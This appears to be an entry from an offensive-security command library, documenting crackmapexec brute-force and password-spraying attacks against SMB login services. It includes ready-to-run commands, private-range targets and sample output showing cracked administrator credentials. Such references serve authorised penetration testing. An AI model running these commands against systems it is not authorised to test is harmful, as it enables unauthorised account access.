---
id: cmd-001
type: command
executor: bash
data: crackmapexec smb $_TARGET -u $_USERS_FILE -p $_PASSWORDS_FILE
output: >-
  [+] 192.168.1.10:445 TARGETHOST Administrator:Password123 STATUS: LOGIN
  SUCCESS
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
tags:
  - brute-force
  - smb
verified: true
validated: true
---

# crackmapexec-smb-brute-force

## Command

```bash
crackmapexec smb $_TARGET -u $_USERS_FILE -p $_PASSWORDS_FILE
```

## Description

Performs brute force attacks against SMB services on a target IP, range, or host list using username and password wordlists. This command enumerates valid credentials by attempting logins and reports successes for further exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET | Target IP, range (e.g., 192.168.1.0/24), or hostname | Yes |
| $_USERS_FILE | Path to file containing usernames (one per line) | Yes |
| $_PASSWORDS_FILE | Path to file containing passwords (one per line) | Yes |
| -d $_DOMAIN | Domain for authentication (e.g., contoso.com) | No |
| --continue-on-success | Keep spraying even after finding valid creds | No |

## Examples

### Basic Usage

```bash
crackmapexec smb 192.168.1.100 -u users.txt -p passes.txt
```

### Advanced Usage

```bash
crackmapexec smb 10.0.0.0/24 -u users.txt -p passes.txt -d DOMAIN.LOCAL --continue-on-success
```

## Expected Output

Description of what output to expect when the command runs successfully.

Example:

```
SMB         192.168.1.10    445    TARGETHOST       [+] DOMAIN\Administrator:Password123 STATUS: LOGIN SUCCESS - Username: Administrator, Password: Password123
SMB         192.168.1.11    445    TARGETHOST2      [-] DOMAIN\Administrator:WrongPass STATUS: LOGIN FAILED
```

## Related

- [[commands/crackmapexec-smb-pth]]
- [[procedures/AD-Credential-Spraying]]
